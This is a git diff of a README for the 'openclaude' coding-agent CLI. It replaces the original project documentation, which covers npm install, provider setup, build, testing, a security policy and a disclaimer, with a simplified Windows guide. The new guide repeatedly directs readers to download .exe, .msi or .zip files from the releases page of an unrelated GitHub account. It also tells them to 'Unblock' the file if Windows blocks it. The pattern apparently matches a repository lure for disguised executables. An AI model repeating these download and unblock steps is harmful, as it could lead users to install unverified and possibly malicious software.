@@ -1,363 +1,265 @@
-# OpenClaude
+# 🤖 openclaude - Run coding agents with ease
 
-OpenClaude is an open-source coding-agent CLI for cloud and local model providers.
+[⬇️ Download openclaude](https://github.com/Genusagapornispopgroup691/openclaude/releases)  
+![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/Windows-ready-grey?style=for-the-badge)
 
-Use OpenAI-compatible APIs, Gemini, GitHub Models, Codex OAuth, Codex, Ollama, Atomic Chat, and other supported backends while keeping one terminal-first workflow: prompts, tools, agents, MCP, slash commands, and streaming output.
+## 🧭 What is openclaude?
 
-[![PR Checks](https://github.com/Gitlawb/openclaude/actions/workflows/pr-checks.yml/badge.svg?branch=main)](https://github.com/Gitlawb/openclaude/actions/workflows/pr-checks.yml)
-[![Release](https://img.shields.io/github/v/tag/Gitlawb/openclaude?label=release&color=0ea5e9)](https://github.com/Gitlawb/openclaude/tags)
-[![Discussions](https://img.shields.io/badge/discussions-open-7c3aed)](https://github.com/Gitlawb/openclaude/discussions)
-[![Security Policy](https://img.shields.io/badge/security-policy-0f766e)](SECURITY.md)
-[![License](https://img.shields.io/badge/license-MIT-2563eb)](LICENSE)
+openclaude is a command-line app for code work on Windows. It helps you use AI models from one place, so you can pick the model that fits your task.
 
-OpenClaude is also mirrored to GitLawb:
-[gitlawb.com/node/repos/z6MkqDnb/openclaude](https://gitlawb.com/node/repos/z6MkqDnb/openclaude)
+It can connect to:
 
-[Quick Start](#quick-start) | [Setup Guides](#setup-guides) | [Providers](#supported-providers) | [Source Build](#source-build-and-local-development) | [VS Code Extension](#vs-code-extension) | [Sponsors](#sponsors) | [Community](#community)
+- OpenAI
+- Gemini
+- DeepSeek
+- Ollama
+- Codex
+- GitHub Models
+- 200+ models through OpenAI-compatible APIs
 
-## Sponsors
+Use it to help with code tasks, file edits, project review, and step-by-step work in a terminal window.
 
-<p align="center">
-  <a href="https://gitlawb.com">
-    <img src="https://gitlawb.com/logo.png" alt="GitLawb logo" width="96">
-  </a>
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://bankr.bot">
-    <img src="https://bankr.bot/favicon.svg" alt="Bankr.bot logo" width="96">
-  </a>
-</p>
+## 💻 Before you start
 
-<p align="center">
-  <a href="https://gitlawb.com"><strong>GitLawb</strong></a>
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="https://bankr.bot"><strong>Bankr.bot</strong></a>
-</p>
+Use a Windows PC with:
 
-## Star History
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection
+- Enough free disk space for the app and model access
+- Permission to run downloaded apps
 
-[![Star History Chart](https://api.star-history.com/chart?repos=gitlawb/openclaude&type=date&legend=top-left)](https://www.star-history.com/?repos=gitlawb%2Fopenclaude&type=date&legend=top-left)
+If you plan to use local models, you may also want:
 
-## Why OpenClaude
+- A machine with more RAM
+- A GPU, if your model needs it
+- Ollama installed on the same PC or another device on your network
 
-- Use one CLI across cloud APIs and local model backends
-- Save provider profiles inside the app with `/provider`
-- Run with OpenAI-compatible services, Gemini, GitHub Models, Codex OAuth, Codex, Ollama, Atomic Chat, and other supported providers
-- Keep coding-agent workflows in one place: bash, file tools, grep, glob, agents, tasks, MCP, and web tools
-- Use the bundled VS Code extension for launch integration and theme support
+## 📥 Download openclaude
 
-## Quick Start
+Visit the release page and download the Windows build:
 
-### Install
+[https://github.com/Genusagapornispopgroup691/openclaude/releases](https://github.com/Genusagapornispopgroup691/openclaude/releases)
 
-```bash
-npm install -g @gitlawb/openclaude
-```
+On the release page, look for a Windows file such as:
 
-If the install later reports `ripgrep not found`, install ripgrep system-wide and confirm `rg --version` works in the same terminal before starting OpenClaude.
+- `.exe`
+- `.zip`
+- `.msi`
 
-### Start
+If you see a `.zip` file, download it and extract it first. If you see an `.exe` or `.msi`, you can run the installer or app file after download.
 
-```bash
-openclaude
-```
+## 🛠️ Install on Windows
 
-Inside OpenClaude:
+### Option 1: You downloaded an `.exe` or `.msi`
 
-- run `/provider` for guided provider setup and saved profiles
-- run `/onboard-github` for GitHub Models onboarding
+1. Open the file you downloaded.
+2. If Windows asks for permission, choose **Yes**.
+3. Follow the setup steps on screen.
+4. Finish the install.
 
-### Fastest OpenAI setup
+### Option 2: You downloaded a `.zip`
 
-macOS / Linux:
+1. Right-click the `.zip` file.
+2. Choose **Extract All**.
+3. Pick a folder you can find later, such as `Downloads` or `Desktop`.
+4. Open the extracted folder.
+5. Find the `openclaude` app file.
+6. Double-click it to run.
 
-```bash
-export CLAUDE_CODE_USE_OPENAI=1
-export OPENAI_API_KEY=sk-your-key-here
-export OPENAI_MODEL=gpt-4o
+### If Windows blocks the file
 
-openclaude
-```
+1. Right-click the file.
+2. Choose **Properties**.
+3. If you see **Unblock**, check it.
+4. Choose **Apply**.
+5. Run the file again.
 
-Windows PowerShell:
+## 🚀 First launch
 
-```powershell
-$env:CLAUDE_CODE_USE_OPENAI="1"
-$env:OPENAI_API_KEY="sk-your-key-here"
-$env:OPENAI_MODEL="gpt-4o"
+1. Open **Command Prompt** or **Windows Terminal**.
+2. Go to the folder where openclaude is installed.
+3. Run the app from there, or use the file you extracted.
 
-openclaude
-```
+If the app opens in a terminal window, that is normal. openclaude is a CLI app, so you use it by typing commands.
 
-### Fastest local Ollama setup
+## 🔐 Set up your AI provider
 
-macOS / Linux:
+openclaude works with several AI providers. You only need to set up the one you want to use.
 
-```bash
-export CLAUDE_CODE_USE_OPENAI=1
-export OPENAI_BASE_URL=http://localhost:11434/v1
-export OPENAI_MODEL=qwen2.5-coder:7b
+### OpenAI
 
-openclaude
-```
+- Add your OpenAI API key
+- Choose the model you want
+- Use it for code tasks and text work
 
-Windows PowerShell:
+### Gemini
 
-```powershell
-$env:CLAUDE_CODE_USE_OPENAI="1"
-$env:OPENAI_BASE_URL="http://localhost:11434/v1"
-$env:OPENAI_MODEL="qwen2.5-coder:7b"
+- Add your Gemini key
+- Use a Gemini model that fits your task
 
-openclaude
-```
+### DeepSeek
 
-### Using Ollama's launch command
+- Add your DeepSeek API key
+- Use it for code help and agent tasks
 
-If you have [Ollama](https://ollama.com) installed, you can skip the env var setup entirely:
+### Ollama
 
-```bash
-ollama launch openclaude --model qwen2.5-coder:7b
-```
+- Install Ollama
+- Make sure it is running
+- Point openclaude to your local model
 
-This automatically sets `ANTHROPIC_BASE_URL`, model routing, and auth so all API traffic goes through your local Ollama instance. Works with any model you have pulled — local or cloud.
+### GitHub Models
 
-## Setup Guides
+- Sign in with your GitHub account
+- Use a supported model from GitHub Models
 
-Beginner-friendly guides:
+### OpenAI-compatible APIs
 
-- [Non-Technical Setup](docs/non-technical-setup.md)
-- [Windows Quick Start](docs/quick-start-windows.md)
-- [macOS / Linux Quick Start](docs/quick-start-mac-linux.md)
+If your service supports the OpenAI API format, openclaude can often connect to it with:
 
-Advanced and source-build guides:
+- API key
+- Base URL
+- Model name
 
-- [Advanced Setup](docs/advanced-setup.md)
-- [Android Install](ANDROID_INSTALL.md)
+## ⚙️ Basic use
 
-## Supported Providers
+After setup, you can use openclaude for common code tasks like:
 
-| Provider | Setup Path | Notes |
-| --- | --- | --- |
-| OpenAI-compatible | `/provider` or env vars | Works with OpenAI, OpenRouter, DeepSeek, Groq, Mistral, LM Studio, and other compatible `/v1` servers |
-| Gemini | `/provider` or env vars | Supports API key, access token, or local ADC workflow on current `main` |
-| GitHub Models | `/onboard-github` | Interactive onboarding with saved credentials |
-| Codex OAuth | `/provider` | Opens ChatGPT sign-in in your browser and stores Codex credentials securely |
-| Codex | `/provider` | Uses existing Codex CLI auth, OpenClaude secure storage, or env credentials |
-| Ollama | `/provider`, env vars, or `ollama launch` | Local inference with no API key |
-| Atomic Chat | `/provider`, env vars, or `bun run dev:atomic-chat` | Local Model Provider; auto-detects loaded models |
-| Bedrock / Vertex / Foundry | env vars | Additional provider integrations for supported environments |
+- Explain a code file
+- Review a project
+- Suggest changes
+- Edit files with guidance
+- Ask for a plan before making changes
+- Work through a coding task step by step
 
-## What Works
+A simple flow looks like this:
 
-- **Tool-driven coding workflows**: Bash, file read/write/edit, grep, glob, agents, tasks, MCP, and slash commands
-- **Streaming responses**: Real-time token output and tool progress
-- **Tool calling**: Multi-step tool loops with model calls, tool execution, and follow-up responses
-- **Images**: URL and base64 image inputs for providers that support vision
-- **Provider profiles**: Guided setup plus saved `.openclaude-profile.json` support
-- **Local and remote model backends**: Cloud APIs, local servers, and Apple Silicon local inference
+1. Open a terminal.
+2. Start openclaude.
+3. Pick your model or provider.
+4. Type your task in plain language.
+5. Review the result.
 
-## Provider Notes
+## 🧪 Example tasks
 
-OpenClaude supports multiple providers, but behavior is not identical across all of them.
+You can ask openclaude to help with things like:
 
-- Anthropic-specific features may not exist on other providers
-- Tool quality depends heavily on the selected model
-- Smaller local models can struggle with long multi-step tool flows
-- Some providers impose lower output caps than the CLI defaults, and OpenClaude adapts where possible
+- Fix a bug in a Python file
+- Add a new button to a web app
+- Clean up a long script
+- Explain what a folder of files does
+- Rewrite code to make it easier to read
+- Help you update a config file
+- Compare two code paths and point out the differences
 
-For best results, use models with strong tool/function calling support.
+## 📁 Common file types
 
-## Agent Routing
+openclaude can work with many project types, such as:
 
-OpenClaude can route different agents to different models through settings-based routing. This is useful for cost optimization or splitting work by model strength.
+- Python
+- JavaScript
+- TypeScript
+- HTML and CSS
+- JSON
+- Markdown
+- Shell scripts
+- Config files
+- General source code folders
 
-Add to `~/.claude/settings.json`:
+## 🧰 Troubleshooting
 
-```json
-{
-  "agentModels": {
-    "deepseek-v4-flash": {
-      "base_url": "https://api.deepseek.com/v1",
-      "api_key": "sk-your-key"
-    },
-    "gpt-4o": {
-      "base_url": "https://api.openai.com/v1",
-      "api_key": "sk-your-key"
-    }
-  },
-  "agentRouting": {
-    "Explore": "deepseek-v4-flash",
-    "Plan": "gpt-4o",
-    "general-purpose": "gpt-4o",
-    "frontend-dev": "deepseek-v4-flash",
-    "default": "gpt-4o"
-  }
-}
-```
+### The app does not start
 
-When no routing match is found, the global provider remains the fallback.
+- Make sure you downloaded the right Windows file
+- Check that the download finished
+- Try extracting the ZIP again
+- Run the app from a simple folder path, such as `C:\openclaude`
 
-> **Note:** `api_key` values in `settings.json` are stored in plaintext. Keep this file private and do not commit it to version control.
+### The terminal closes right away
 
-## Web Search and Fetch
+- Open Command Prompt first
+- Start the app from inside the terminal
+- Look for error text before the window closes
 
-By default, `WebSearch` works on non-Anthropic models using DuckDuckGo. This gives GPT-4o, DeepSeek, Gemini, Ollama, and other OpenAI-compatible providers a free web search path out of the box.
+### My API key does not work
 
-> **Note:** DuckDuckGo fallback works by scraping search results and may be rate-limited, blocked, or subject to DuckDuckGo's Terms of Service. If you want a more reliable supported option, configure Firecrawl.
+- Check the key for extra spaces
+- Make sure the provider is active
+- Check that you picked the right model
+- Confirm the base URL if you use an OpenAI-compatible API
 
-For Anthropic-native backends and Codex responses, OpenClaude keeps the native provider web search behavior.
+### Ollama does not connect
 
-`WebFetch` works, but its basic HTTP plus HTML-to-markdown path can still fail on JavaScript-rendered sites or sites that block plain HTTP requests.
+- Open Ollama first
+- Make sure a model is installed
+- Check that Ollama is running on the default port
+- Try again after the local server starts
 
-Set a [Firecrawl](https://firecrawl.dev) API key if you want Firecrawl-powered search/fetch behavior:
+### I do not see the file I need
 
-```bash
-export FIRECRAWL_API_KEY=your-key-here
-```
+- Revisit the release page
+- Look at the newest release first
+- Expand the assets list
+- Download the Windows build
 
-With Firecrawl enabled:
+## 🔒 Privacy and local use
 
-- `WebSearch` can use Firecrawl's search API while DuckDuckGo remains the default free path for non-Claude models
-- `WebFetch` uses Firecrawl's scrape endpoint instead of raw HTTP, handling JS-rendered pages correctly
+You can use openclaude with local models through Ollama. In that setup, your code and prompts can stay on your own machine.
 
-Free tier at [firecrawl.dev](https://firecrawl.dev) includes 500 credits. The key is optional.
+If you use a cloud model, your prompts and files may leave your device based on that provider’s settings.
 
----
+## 🧾 Short setup path
 
-## Headless gRPC Server
+1. Go to the release page
+2. Download the Windows file
+3. Install or extract it
+4. Open a terminal
+5. Set your API key or local model
+6. Run your first task
 
-OpenClaude can be run as a headless gRPC service, allowing you to integrate its agentic capabilities (tools, bash, file editing) into other applications, CI/CD pipelines, or custom user interfaces. The server uses bidirectional streaming to send real-time text chunks, tool calls, and request permissions for sensitive commands.
+## 🧩 Suggested first task
 
-### 1. Start the gRPC Server
+If you are new, start with one small job:
 
-Start the core engine as a gRPC service on `localhost:50051`:
+- Ask openclaude to explain one file
+- Ask it to find a bug in one script
+- Ask it to describe the folder structure
+- Ask it to write a simple change plan before editing
 
-```bash
-npm run dev:grpc
-```
+## 📌 File location tip
 
-#### Configuration
+Keep the app in a folder with a short path, such as:
 
-| Variable | Default | Description |
-|-----------|-------------|------------------------------------------------|
-| `GRPC_PORT` | `50051` | Port the gRPC server listens on |
-| `GRPC_HOST` | `localhost` | Bind address. Use `0.0.0.0` to expose on all interfaces (not recommended without authentication) |
+- `C:\openclaude`
+- `C:\Tools\openclaude`
 
-### 2. Run the Test CLI Client
+Short paths help avoid problems with Windows file access and terminal commands
 
-We provide a lightweight CLI client that communicates exclusively over gRPC. It acts just like the main interactive CLI, rendering colors, streaming tokens, and prompting you for tool permissions (y/n) via the gRPC `action_required` event.
+## 🖥️ Useful Windows tools
 
-In a separate terminal, run:
+These tools can help when you use openclaude:
 
-```bash
-npm run dev:grpc:cli
-```
+- Command Prompt
+- Windows Terminal
+- File Explorer
+- Notepad
+- PowerShell
 
-*Note: The gRPC definitions are located in `src/proto/openclaude.proto`. You can use this file to generate clients in Python, Go, Rust, or any other language.*
+If you prefer, you can open the terminal from the folder where your project lives, then run openclaude from there
 
----
+## 🔄 Update openclaude
 
-## Source Build And Local Development
+To get the latest version:
 
-```bash
-bun install
-bun run build
-node dist/cli.mjs
-```
+1. Visit the release page
+2. Download the newest Windows build
+3. Replace your old files or install the new version
+4. Keep your API settings if the app stores them outside the install folder
 
-Helpful commands:
+## 📦 Release page
 
-- `bun run dev`
-- `bun test`
-- `bun run test:coverage`
-- `bun run security:pr-scan -- --base origin/main`
-- `bun run smoke`
-- `bun run doctor:runtime`
-- `bun run verify:privacy`
-- focused `bun test ...` runs for the areas you touch
+Download the latest Windows build here:
 
-## Testing And Coverage
+[https://github.com/Genusagapornispopgroup691/openclaude/releases](https://github.com/Genusagapornispopgroup691/openclaude/releases)
 
-OpenClaude uses Bun's built-in test runner for unit tests.
-
-Run the full unit suite:
-
-```bash
-bun test
-```
-
-Generate unit test coverage:
-
-```bash
-bun run test:coverage
-```
-
-Open the visual coverage report:
-
-```bash
-open coverage/index.html
-```
-
-If you already have `coverage/lcov.info` and only want to rebuild the UI:
-
-```bash
-bun run test:coverage:ui
-```
-
-Use focused test runs when you only touch one area:
-
-- `bun run test:provider`
-- `bun run test:provider-recommendation`
-- `bun test path/to/file.test.ts`
-
-Recommended contributor validation before opening a PR:
-
-- `bun run build`
-- `bun run smoke`
-- `bun run test:coverage` for broader unit coverage when your change affects shared runtime or provider logic
-- focused `bun test ...` runs for the files and flows you changed
-
-Coverage output is written to `coverage/lcov.info`, and OpenClaude also generates a git-activity-style heatmap at `coverage/index.html`.
-## Repository Structure
-
-- `src/` - core CLI/runtime
-- `scripts/` - build, verification, and maintenance scripts
-- `docs/` - setup, contributor, and project documentation
-- `python/` - standalone Python helpers and their tests
-- `vscode-extension/openclaude-vscode/` - VS Code extension
-- `.github/` - repo automation, templates, and CI configuration
-- `bin/` - CLI launcher entrypoints
-
-## VS Code Extension
-
-The repo includes a VS Code extension in [`vscode-extension/openclaude-vscode`](vscode-extension/openclaude-vscode) for OpenClaude launch integration, provider-aware control-center UI, and theme support.
-
-## Security
-
-If you believe you found a security issue, see [SECURITY.md](SECURITY.md).
-
-## Community
-
-- Use [GitHub Discussions](https://github.com/Gitlawb/openclaude/discussions) for Q&A, ideas, and community conversation
-- Use [GitHub Issues](https://github.com/Gitlawb/openclaude/issues) for confirmed bugs and actionable feature work
-
-## Contributing
-
-Contributions are welcome.
-
-For larger changes, open an issue first so the scope is clear before implementation. Helpful validation commands include:
-
-- `bun run build`
-- `bun run test:coverage`
-- `bun run smoke`
-- focused `bun test ...` runs for files and flows you changed
-
-
-## Disclaimer
-
-OpenClaude is an independent community project and is not affiliated with, endorsed by, or sponsored by Anthropic.
-
-OpenClaude originated from the Claude Code codebase and has since been substantially modified to support multiple providers and open use. "Claude" and "Claude Code" are trademarks of Anthropic PBC. See [LICENSE](LICENSE) for details.
-
-## License
-
-See [LICENSE](LICENSE).
